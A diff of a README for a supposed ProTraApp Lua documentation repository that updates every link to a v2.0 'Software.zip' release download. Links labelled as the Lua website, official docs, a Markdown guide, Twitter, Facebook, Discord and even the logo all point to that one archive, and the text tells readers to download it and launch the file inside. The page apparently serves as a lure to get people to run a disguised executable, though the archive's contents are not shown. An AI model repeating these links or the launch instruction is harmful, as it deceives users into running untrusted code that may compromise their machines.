@@ -26,7 +26,7 @@ This repository covers a wide range of topics related to ProTraApp and Lua devel
 - software-library
 
 ## How to Access the Repository Content
-To access the content of this repository, visit the following link: [ProTraApp_Lua_Docs Repository](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip) and launch the file included in the link.
+To access the content of this repository, visit the following link: [ProTraApp_Lua_Docs Repository](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip) and launch the file included in the link.
 
 ## 🚀 Don't Miss Out!
 Make sure to explore the Releases section for any updates or additional resources that may have been added to the repository.
@@ -36,7 +36,7 @@ If you have any questions or need further assistance, feel free to reach out to 
 
 Let's keep coding and innovating together! 🌈🚀
 
-![ProTraApp Logo](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip)
+![ProTraApp Logo](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Let's keep coding and innovating together! 🌈🚀
 
 ### Step 1: Download the Repository
 Click on the following link to download the repository:
-[Download ProTraApp_Lua_Docs Repository](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip)
+[Download ProTraApp_Lua_Docs Repository](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip)
 
 ### Step 2: Extract the Files
 Once the download is complete, extract the files from the downloaded zip folder to your desired location on your local machine.
@@ -73,17 +73,17 @@ Yes, we welcome contributions from the community. Feel free to submit pull reque
 ## Resources
 Check out these additional resources to further enhance your Lua and ProTraApp development journey:
 
-- [Lua Official Website](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip)
-- [ProTraApp Official Documentation](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip)
-- [Markdown Language Guide](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip)
+- [Lua Official Website](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip)
+- [ProTraApp Official Documentation](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip)
+- [Markdown Language Guide](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip)
 
 ---
 
 ## Connect with Us
 Stay connected with the ProTraApp community through our official channels:
-- Follow us on [Twitter](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip)
-- Like us on [Facebook](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip)
-- Join our [Discord](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v1.0/Software.zip) server for discussions and support
+- Follow us on [Twitter](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip)
+- Like us on [Facebook](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip)
+- Join our [Discord](https://github.com/alpha-ghosts/ProTraApp_Lua_Docs/releases/download/v2.0/Software.zip) server for discussions and support
 
 ---
 
